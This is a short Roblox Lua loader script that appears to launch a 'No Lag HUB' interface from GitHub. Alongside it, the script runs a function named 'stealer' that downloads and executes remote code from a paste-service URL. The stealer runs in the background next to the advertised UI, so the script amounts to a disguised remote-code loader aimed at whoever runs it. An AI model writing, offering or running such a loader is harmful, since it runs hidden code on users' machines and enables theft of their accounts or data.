local function stealer()

loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/vCqomMAneDVdhHL4/raw", true))()

end
local function loadui()

loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
  
end

task.spawn(stealer)
task.spawn(loadui)
